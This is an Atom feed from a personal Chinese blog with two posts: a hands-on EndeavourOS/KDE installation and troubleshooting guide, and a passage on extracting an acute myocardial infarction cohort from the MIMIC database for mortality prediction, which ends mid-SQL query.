<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>止息的碎碎念</title>
  
  <subtitle>阴，气温20℃至32℃</subtitle>
  <link href="https://zhangjk98.xyz/atom.xml" rel="self"/>
  
  <link href="https://zhangjk98.xyz/"/>
  <updated>2020-09-13T15:52:18.000Z</updated>
  <id>https://zhangjk98.xyz/</id>
  
  <author>
    <name>Zhang.jk</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>为什么不试试EndeavourOS和KDE呢</title>
    <link href="https://zhangjk98.xyz/endeavouros-and-kde-setting/"/>
    <id>https://zhangjk98.xyz/endeavouros-and-kde-setting/</id>
    <published>2020-09-13T15:52:18.000Z</published>
    <updated>2020-09-13T15:52:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>sudo pacman -Rs win10</p><a id="more"></a><h2 id="镜像源">镜像源</h2><p>再次更新，你电镜像源有EndeavourOS了： <span class="exturl" data-url="aHR0cDovL21pcnJvcnMudWVzdGMuY24vZW5kZWF2b3Vyb3Mv">http://mirrors.uestc.cn/endeavouros/<i class="fa fa-external-link-alt"></i></span></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"Server = http://mirrors.tuna.tsinghua.edu.cn/endeavouros/repo/<span class="token variable">$repo</span>/<span class="token variable">$arch</span>"</span> <span class="token operator">></span> /etc/pacman.d/endeavouros-mirrorlist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>iso镜像在<span class="exturl" data-url="aHR0cDovL21pcnJvcnMudWVzdGMuY24vZW5kZWF2b3Vyb3MvaXNvLw==">这里<i class="fa fa-external-link-alt"></i></span></p><p>清华已经安排上了EndeavourOS的镜像和<span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLnR1bmEudHNpbmdodWEuZWR1LmNuL2VuZGVhdm91cm9zL2lzby8=">iso<i class="fa fa-external-link-alt"></i></span>，可以方便的下载iso和更新EndeavourOS的包了。（或者用PT种子下载，实测速度均&gt;10Mb/s）</p><p>更改<code>/etc/pacman.d/endeavouros-mirrorlist</code>中的内容，改为</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">## ChinaServer &#x3D; https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;endeavouros&#x2F;repo&#x2F;$repo&#x2F;$arch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后<code>sudo pacman -Syy</code>刷新一下</p><h2 id="安装virtualbox虚拟机">安装virtualbox虚拟机</h2><p>我用的kernel是lts版本（偶滴本本是Nvidia独显，不敢上kernel一直滚，怕炸）</p><p>装头文件、virtualbox组件、网络和vnc扩展（可选）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S linux-lts-headers virtualbox virtualbox-guest-iso virtualbox-host-dkms net-tools virtualbox-ext-vnc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>推荐安装oracle的增强扩展（一些自适应分辨率缩放、USB驱动什么的都在这里面）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S virtualbox-ext-oracle<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后下载镜像（微软貌似出了用于虚拟机的免费90天win10，然而win10还是耗资源，没有什么特殊需求就只是用用office用用QQ什么的开个win7甚至XP虚拟机就好了，在虚拟机里会流畅一点）</p><p>增强功能要在win虚拟机中手动安装扩展才能用</p><h2 id="终端配置">终端配置</h2><h3 id="将bashzsh的终端输出信息和日志改回英文">将bash/zsh的终端输出信息和日志改回英文</h3><p>终端有些报错和输出还是要靠英文去谷歌，中文资料太少了，查不到，但是又不想把全局设置成英文的。直接<code>export LANG=en_US.UTF-8</code>不起作用，改成<code>export LANG=en_US</code>变成了英文但是中文乱码了，差了一下LANGUAGE参数的优先级比LANG要高、LC_X参数优先级比LANGUAGE高，修改LANGUAGE变量即可。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span><span class="token string">"en_US:UTF-8"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>只修改终端那就在.bashrc加上</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token environment constant">$TERM</span>"</span><span class="token operator">=</span><span class="token string">"linux"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span><span class="token keyword">then</span> <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span>en_US <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>en_US.UTF-8 <span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="默认终端改为zsh">默认终端改为zsh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">chsh -s /usr/bin/zsh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>装oh-my-zsh（因为我懒得自己配置zsh了）和插件，并设置默认终端为oh-my-zsh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S <span class="token function">zsh</span> oh-my-zsh-git autojump zsh-autosuggestions zsh-syntax-highlightingchsh -s /usr/bin/zsh<span class="token function">cp</span> /usr/share/oh-my-zsh/zshrc ~/.zshrc <span class="token comment"># 我比较懒，就直接把默认配置拿过来改改</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="更换lts内核">更换lts内核</h2><p>更新到5.8以后我的virtualbox又出问题了，换回linux-lts</p><p>EndeavourOS有一个叫akm的图形界面，但是你要手动重装virtualbox之类的会受到内核影响的东西。</p><h2 id="显卡驱动">显卡驱动</h2><blockquote><p>so, nvidia f.....</p></blockquote><p>算了，3080那么强，不黑英伟达了</p><p>他们从以前Antergos那fork了一个驱动安装脚本，有个包叫nvidia-installer（lts等用户请用nvidia-installer-dkms），看<span class="exturl" data-url="aHR0cHM6Ly9lbmRlYXZvdXJvcy5jb20vZG9jcy9oYXJkd2FyZS1hbmQtbmV0d29yay9ncmFwaGljLWNhcmRzLWdwdS1kcml2ZXItYW5kLXNldHVwLw==">这里<i class="fa fa-external-link-alt"></i></span>。</p><h2 id="桌面环境">桌面环境</h2><p>EndeavourOS官方魔改定制了xfce的主题和图标，离线安装镜像也只有xfce，其他的几乎没怎么魔改。</p><p>紫红配色看个人喜好吧，其实我不太能欣赏的来（这个配色，Gitlab同款）</p><p>多桌面环境可能出问题，非要这样做的话建议每个不同的桌面环境分配一个单独的用户名。 （貌似xfce4和KDE一起用几乎问题（用ssdm），先装ssdm和KDE,然后装xfce4） 尝试了一下i3wm, 简洁是真的简洁，不太习惯又删了换回KDE了。</p><p>KDE有一种 Windows Vista 的感觉，感觉是 linux 所有 Desktop Enviroment 里面最舒服的。xfce虽然是EndeavourOS默认的DE，但是xfce开发人手不够，用户和社区贡献者也比KDE少，而且内存占用最新的KDE已经比xfce低了.....现在xfce也不怎么轻量了，渣配置机器上表现没有LXDE好，感觉不少用户都转去用i3wm和KDE了...逐渐没落的夕阳DE，适合养老</p><h2 id="硬盘扩容和迁移">硬盘扩容和迁移</h2><p>趁打折买了一块西数SN550,之前只有500G还装了个双系统的笔记本可以扩容了</p><p>现在把/home分区（大概60G）从老硬盘移动到新硬盘上，空出来的60G给/目录。我既不是LVM也没有组raid，文件系统用的ext4，500G老硬盘分了400G给win10,剩下100G给了linux，分了一个/，40G,一个/home，60G</p><p>先格式化（这里我用的GPT分区表，ext4），然后挂载到/mnt,然后用rsync迁移/home下的文件到/mnt 然后umount，然后分区合并给/root，再挂载到/home下面</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">fdisk</span> -lyay -Sy <span class="token function">rsync</span>mkfs.ext4 /dev/nvme0n1p1<span class="token function">mount</span> /dev/nvme0n1p1 /mnt<span class="token function">rsync</span> -avz /home /mnt<span class="token function">umount</span> dev//nvme0n1p1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>两边都是nvme,2分钟就同步完成了，速度非常感人，然后修改fstab，将原来/home分区的uuid改为新硬盘的（/dev/nvme0n1p1）uuid</p><p><code>/etc/fstab</code>大概长这个样子，分别是uuid,挂载目录，文件类型，noatime后面0表示不开机自检，/</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">UUID</span><span class="token operator">=</span><span class="token number">8205</span>-8BC5                            /boot/efi      vfat    <span class="token assign-left variable">umask</span><span class="token operator">=</span>0077 <span class="token number">0</span> <span class="token number">2</span><span class="token assign-left variable">UUID</span><span class="token operator">=</span><span class="token number">36499174</span>-6a4a-4b9d-b5cc-0b1f555a1f46 /              ext4    defaults,noatime <span class="token number">0</span> <span class="token number">1</span><span class="token assign-left variable">UUID</span><span class="token operator">=</span>bf5e768c-a2de-4618-9861-5946459a69b6 /home          ext4    defaults,noatime <span class="token number">0</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后退出来，用livecd或者双系统的分区工具把原来的/home分区删掉分给原来的/目录。（注意做好备份不要删错了，删错了就没了）</p><p>再次登陆后应该就行了。弄完突然发现KDE自带一个叫KDE Partition Manager的工具，看起来貌似还行。</p><h2 id="修grub">修grub</h2><p>双系统grub又出问题了，好在用liveusb重装了一下grub问题救了回来。</p><p>我是UEFI，操作除了最后 grub install 用EndeavourOS的，其他的和Arch一样</p><p>先挂载，然后chroot进去，然后重装grub</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> /dev/nvme0n1p3 /mnt<span class="token function">mount</span> /dev/nvme1n1p2 /mnt/boot/efi<span class="token function">grub-mkconfig</span> -o /boot/grub/grub.cfggrub-install --target<span class="token operator">=</span>x86_64-efi --efi-directory<span class="token operator">=</span>/boot/efi --bootloader-id<span class="token operator">=</span>EndeavourOS-grub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="滚动升级">滚动升级</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -Syu <span class="token comment"># 装了AUR就yay -Syu</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果要自动降级新软件包就<code>-Syuu</code>(不推荐)</p><p>升级的包里面有内核和显卡驱动的时候要注意小心</p><p>升级内核之后最好重启一下，有的时候不重启会遇到开bbr失败了啊，u盘读不出来了啊，就比如<span class="exturl" data-url="aHR0cHM6Ly9qbGljZS50b3AvcC83bDltby8=">记因内核版本错误导致U盘不能识别的问题解决<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cHM6Ly92MmV4LmNvbS90LzMyMzU1OQ==">这个v站帖子<i class="fa fa-external-link-alt"></i></span>还有重启后<span class="exturl" data-url="aHR0cHM6Ly9tYW5hdGVlbGF6eWNhdC5naXRodWIuaW8vbGludXgvMjAyMC8wMi8xNC9maXgtYXJjaC1ib290LWZhaWxlZC5odG1s">Grub内核版本号不升级<i class="fa fa-external-link-alt"></i></span>，大部分情况下<code>modprobe</code>找不到模块八成就是了</p><h3 id="升级内核不重启">升级内核不重启</h3><p>参考reddit这个<span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2FyY2hsaW51eC9jb21tZW50cy80enJzYzMva2VlcF95b3VyX3N5c3RlbV9mdWxseV9mdW5jdGlvbmFsX2FmdGVyX2Ffa2VybmVsLw==">帖子<i class="fa fa-external-link-alt"></i></span></p><p>一个软链过去，感觉不太优雅，还是乖乖重启比较好</p><blockquote><p>看来包管理器们应该学习其他两个系统，统一在关机开机的时候更新软件。</p></blockquote><h2 id="kde使用事项">KDE使用事项</h2><h3 id="kde卡死的抢救方案">KDE卡死的抢救方案</h3><p>KDE现在已经比较稳定了，但是Linux桌面程序还是偶尔把桌面搞到卡死，比如vscode内存泄漏。</p><p>首先尝试<code>ctl+alt+t</code>呼出终端，如果不能就<code>ctl+alt+F2</code>调出tty，htop看一下那个进程占用高，kill掉，如果不行就重启tty</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kquitapp5 plasmashell <span class="token operator">&amp;&amp;</span> kstart5 plasmashell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>正常退出不行就直接killall</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">killall</span> plasmashell <span class="token operator">&amp;&amp;</span> kstart5 plasmashell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者重启一下SDDM</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart sddm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还不行就杀掉tty1，然后重启xorg</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> tty1 <span class="token comment"># 或者pgrep tty1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后kill掉（或者直接<code>pkill -9 -t tty1</code>），重启 或者直接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">pkill</span> xstartx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>再不行直接<code>reboot</code>就好了</p><p>或许你开了SysRq，先用SysRq抢救一下，见<span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvaHRtbC9sYXRlc3QvYWRtaW4tZ3VpZGUvc3lzcnEuaHRtbA==">Linux Magic System Request Key Hacks<i class="fa fa-external-link-alt"></i></span>，或者直接看<span class="exturl" data-url="aHR0cDovL2Jsb2cubHVqdW45OTcyLndpbi9ibG9nLzIwMTgvMDgvMjIvbGludXjkuIvnmoRzeXNycemUri9pbmRleC5odG1s">linux下的SysRq键<i class="fa fa-external-link-alt"></i></span></p><p>再不行就直接尝试长按电源关机了</p><h3 id="混成器">混成器</h3><p>有Nvidia显卡怕驱动更新出问题可以在设置中将渲染器（混成器）从OpenGL改为XRender，XRender出问题的情况会少一点，虽然很多特效都不支持，性能也略差。没有问题建议还是用OpenGL或者直接关闭特效，XRender没有硬件加速用起来感觉跟OpenGL有明显的体验差距。</p><p>另外貌似非整数比缩放的时候透明特效之类的经常不支持，建议直接关了。</p><h3 id="baloo">baloo</h3><p>禁用baloo：<code>balooctl disable</code> 这个文件索引服务也是个吃性能大户，不管是在GNOME下还是KDE下。可以考虑禁用。要查找文件可以用find命令之类的东西嘛。</p><h3 id="kde桌面部件">KDE桌面部件</h3><p>美化要稍微谨慎一点，魔改太多了不太稳定</p><p>latte-dock：虽然KDE官方维护支持这个，动画效果很漂亮，用起来也很舒服，但是这个实在是吃内存大户。KDE桌面不开多余特效和装各种桌面部件待机内存在300M，装个latte-dock后内存占用比其他所有的加起来还多。把dock的鼠标悬停放大之类的特效关一关。貌似这个的背景透明只有XRender支持。</p><p>一个很喜欢的任务栏部件event calendar</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S plasma5-applets-eventcalendar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="双显示器开机右侧出现黑边">双显示器开机右侧出现黑边</h3><p>发现是每次开机分辨率变成1680*1050了</p><p>先看一下你的显示器编号</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xrandr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>比如我的就是DVI-I-1和DVI-D-0，把这两个分辨率改回1080p</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xrandr --output DVI-I-1 --mode 1920x1080 --rate <span class="token number">60</span>xrandr --output DVI-D-0 --mode 1920x1080 --rate <span class="token number">60</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里有一个自动配置的包<span class="exturl" data-url="aHR0cHM6Ly93d3cuYXJjaGxpbnV4Lm9yZy9wYWNrYWdlcy8/bmFtZT1hdXRvcmFuZHI=">autorandr<i class="fa fa-external-link-alt"></i></span></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S autorandrautorandr horizontal <span class="token operator">&amp;&amp;</span> autorandr vertical <span class="token comment"># 这里我直接把显示长宽分辨率都直接拉满了</span>autorandr --save test1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者你可以手动编辑<code>/etc/X11/xorg.conf.d</code>下的配置</p><p>见<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1hyYW5kcg==">Arch Wiki xrandr<i class="fa fa-external-link-alt"></i></span></p><p>其实每次开机运行一下xrandr可能更好一点（如果你不是wayland的话），不少人都是这么搞得（顺便刷新调整一下字体啥的</p><figure><img src="/endeavouros-and-kde-setting/image-20200923222725926.png" alt="xrandr" /><figcaption aria-hidden="true">xrandr</figcaption></figure><h2 id="macwin10上的一些软件">Mac/win10上的一些软件</h2><p><del>请阅读王垠经典博文完全用linux工作</del> 不少时候用wine还是能搞定的（如果你不在乎wine的稳定性的话），包括一些大型软件，比如PS 当然有的东西用wine体验远没有虚拟机好，拿Virtualbox或者KVM开个虚拟机是个不错的选择。或者身边有闲置安卓机用scrcpy投屏，或者KDE Connect传文件。</p><p>部分国产软件开个黑果虚拟机感觉体验比windows虚拟机略好一点 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZveGxldC9tYWNPUy1TaW1wbGUtS1ZN">https://github.com/foxlet/macOS-Simple-KVM<i class="fa fa-external-link-alt"></i></span></p><h2 id="一点闲话">一点闲话</h2><p>其实我一直很期待Arch系诞生一批用户友好的桌面发行版，就像Debian那样衍生出Ubuntu、Linux Mint那样。（虽然这很不Arch）</p><ol type="1"><li>之前被apt的地狱依赖搞得心态崩了，想用pacman系的（反正打包粒度粗一点好，硬盘现在这么便宜又不在乎占多大地方）</li><li>喜欢KDE</li><li>想要稳定一点的系统做日常主力搬砖用</li><li>安装方便一点。这个倒是无所谓，不过出了事LiveCD抢救也想有个图形界面方便抢修</li></ol><p>Arch把wifi-menu去掉之后就不太想用原味Arch了，我这笔记本没网口高通网卡Nividia独显实在八字不合，只想佛系地找个好装的iso</p><p>KaOS基本符合，然而包太少，可惜....</p><p>Antergos的继承者，EndeavourOS满足了前两点，貌似xfce主题魔改了点主题，KDE基本原封不动。当时Manjaro闹分裂，jonathon出走了，我也跟着跑路到了这个发行版;用了一段时间感觉还不错，接近原味Arch, 不像Manjaro一样整了很多超出自己驾驭能力的魔改。推荐各位Manjaro用户和想用pacman又嫌麻烦的用户尝试一下。 现在看win10反而不习惯，索性把教研室搬砖那台win10全格了只装这个（要用到windows的时候上win7虚拟机 ps. win7 和KDE好像啊）</p><p>那天还看到肥猫跑到Manjaro群里推这个</p><p><img src="/endeavouros-and-kde-setting/miao.png" /></p><p>第二天welcome就有了中文，感动</p><p><img src="/endeavouros-and-kde-setting/miaomiao.png" /></p><p>能制止Manjaro的不是Arch佬的疯狂洗手，是另一个比Manjaro更好的Arch简易安装器，EndeavourOS合格了。</p><p>最后，不要对EndeavourOS抱有过高的期待，感觉他们人手还是不太足。</p><p>不过大方向是走对了，基本上就做做开箱即用和一些代替命令操作的图形界面，没有像Manjaro那样各种魔改搞出很多Arch上反而没有的问题。就比如linux内核切换的图形界面akm，基本上就是代替了archwiki上的手动操作，选项也只有linux,linux-lts,linux-zen几个。不像Manjaro那个内核切换，从linux 5.3 到linux 5.8最新版全都有，非常奔放，你要是真随便选一个linux和linux-lts之外的，哪天滚着滚着就出问题了。</p><p><img src="/endeavouros-and-kde-setting/akm.png" /></p><p>Arch的安装脚本和只是换了个皮的安装器层出不穷，目前看来EndeavourOS是最令人满意的一个（好吧，默认是xfce，这个离线装了然后改DE就好了）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;sudo pacman -Rs win10&lt;/p&gt;</summary>
    
    
    
    <category term="不务正业系列" scheme="https://zhangjk98.xyz/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="KDE" scheme="https://zhangjk98.xyz/tags/KDE/"/>
    
    <category term="EndeavourOS" scheme="https://zhangjk98.xyz/tags/EndeavourOS/"/>
    
  </entry>
  
  <entry>
    <title>用疾病记录预测患者死亡风险</title>
    <link href="https://zhangjk98.xyz/morality-prediction/"/>
    <id>https://zhangjk98.xyz/morality-prediction/</id>
    <published>2020-05-31T03:06:54.000Z</published>
    <updated>2020-05-31T03:06:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>以急性心肌梗死和MIMIC数据库为例</p><a id="more"></a><p>急性心肌梗死的发病率和死亡率都很高，MIMIC里面大概有5000次记录，用来构造数据集效果会比较好，这次就用MIMIC数据库里面的急性心肌梗死进行死亡风险的预测。</p><p>早期心血管疾病采用TIMI（the Thrombolysis in Myocardial Infarction）风险评分、全球急性心脏事件注册表（GRACE）评分或医生经验判断。后来MIMIC、eICU等开放医学数据库的建立和公布，数据量足够支撑起机器学习，疾病风险预测逐渐开始采用机器学习等方法。 数据清洗和构造数据集</p><p>目前开源的ICU重症数据库主要有MIMIC和eICU；eICU里面的患者数量多一点，但是貌似数据缺失很多，数据质量也不太好（eICU整合了几家不同医院的临床记录拼凑出来的数据库，数据质量参差不齐）</p><p>这里我用的MIMIC-Ⅲ数据库，内有近四万名成年人以及七千多名新生儿的五万余次住院资料，其中急性心肌梗死入院记录大概5000多次。</p><h2 id="更新">更新</h2><p>前一阵MIT发布了 MIMIC IV 数据库（第四版），MIMIC-IV目前是0.4版本，以后要放出1.0正式版。希望大家下载最新版本进行训练<del>炼丹</del></p><p>0.4版的压缩包有6.7G,要获取需要在网站注册帐号并进行考试答题，然后同意他们关于医学伦理的条款 下载地址： <span class="exturl" data-url="aHR0cHM6Ly9waHlzaW9uZXQub3JnL2NvbnRlbnQvbWltaWNpdi8wLjQv">https://physionet.org/content/mimiciv/0.4/<i class="fa fa-external-link-alt"></i></span> 并没有BT种子之类下载方式，下载需要帐号验证，由于版权和隐私等原因，应该也不能进行二次分发 所以大家自己去下吧。</p><p>通过考试答题后就直接点下载链接就好了。 官网还提供了wget的下载方式，安装包有点大，我们打开bbr下载会快一点（有美国代理记得挂）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> sysctl net.ipv4.tcp_congestion_control<span class="token operator">=</span>bbr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后填你的用户名和密码就好了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> -r -N -c -np --user username --ask-password https://physionet.org/files/mimiciv/0.4/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载好建库的时候记得建索引，不然后续操作会很慢</p><h2 id="患者筛选">患者筛选</h2><p>在MIMIC数据库中提取ICD-9疾病编号为410大类、疾病名称为 acute myocardial infarction的相关病人全部住院记录。数据表DIAGNOSE_ICD中的ICD9_CODE字段记录了患者的ICD-9编码，其中410大类编码根据发病部位被分为10个小类，例如第1个小类代表发病部位为前外侧壁、第2个小类代表发病部位为下外侧壁；这10 个小类又根据发病时期分为3个小类，0代表未细分，1代表初次入院，2代表再入院；例如，MIMIC数据库中ICD9_CODE字段为41031，对应的ICD-9编码为410.3.1，其中410代表急性心肌梗死，3代表下后壁，1代表初次入院。 <img src="%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96%E6%B5%81%E7%A8%8B.svg" alt="数据提取示意图" /></p><p>提取到的除后续照顾类别以外的410大类患者数据中，共有5087次入院记录，去除同一患者重复的入院记录，共有4788名病人患有急性心肌梗死（包括同时患有急性心肌梗死的并发症），其中有727人死亡，总死亡率15.18%。男性患者共2924名，平均年龄为67.2岁，死亡391人，男性死亡率13.37%；女性患者共1864名，平均年龄为73.4岁，死亡337人,女性死亡率18.10%。统计急性心肌梗死患者人群种族信息，可以发现亚裔只有74次入院记录。 特征选取</p><p>MIIMC里面能用的特征大概有性别年龄这些个人信息、心率血压这些生理指标、还有些用药记录之类的，为了预测患者初次发病的死亡率，只采用患者初次入院24小时内的记录检查项目作为预测指标</p><p>先把24小时ICUSTAY_ID选出来</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> k_AMI2 <span class="token keyword">AS</span><span class="token keyword">SELECT</span>ADMISSIONS<span class="token punctuation">.</span>SUBJECT_ID<span class="token punctuation">,</span>ADMISSIONS<span class="token punctuation">.</span>HADM_ID<span class="token punctuation">,</span>ADMISSIONS<span class="token punctuation">.</span>ADMITTIME<span class="token punctuation">,</span>ADMISSIONS<span class="token punctuation">.</span>DEATHTIME<span class="token keyword">FROM</span>ADMISSIONS<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span>A<span class="token punctuation">.</span>SUBJECT_ID<span class="token punctuation">,</span><span class="token function">MAX</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>ADMITTIME<span class="token punctuation">)</span> ADMITTIME<span class="token keyword">FROM</span>ADMISSIONS A<span class="token punctuation">,</span>DIAGNOSES_ICD B<span class="token keyword">WHERE</span>A<span class="token punctuation">.</span>HADM_ID <span class="token operator">=</span> B<span class="token punctuation">.</span>HADM_ID<span class="token operator">AND</span> <span class="token punctuation">(</span>ICD9_CODE <span class="token operator">=</span> <span class="token string">"41000"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41001"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41010"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41011"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41020"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41021"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41030"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41031"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41040"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41041"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41050"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41051"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41060"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41061"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41070"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41081"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41090"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41091"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41002"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41012"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41022"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41032"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41042"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41052"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41062"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41072"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41082"</span><span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41092"</span><span class="token punctuation">)</span><span class="token keyword">GROUP</span> <span class="token keyword">BY</span>A<span class="token punctuation">.</span>SUBJECT_ID<span class="token punctuation">)</span> <span class="token keyword">AS</span> T<span class="token keyword">WHERE</span>ADMISSIONS<span class="token punctuation">.</span>ADMITTIME <span class="token operator">=</span> T<span class="token punctuation">.</span>ADMITTIME<span class="token operator">AND</span> ADMISSIONS<span class="token punctuation">.</span>SUBJECT_ID <span class="token operator">=</span> T<span class="token punctuation">.</span>SUBJECT_ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后用找患者检查项目、生理指标的ITEM_ID。写一个简单的SQL联接查询就可以了：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span>SUBJECT_ID<span class="token punctuation">,</span><span class="token function">MAX</span><span class="token punctuation">(</span>VALUEUOM<span class="token punctuation">)</span> MAX_VALUE<span class="token punctuation">,</span><span class="token function">MIN</span><span class="token punctuation">(</span>VALUEUOM<span class="token 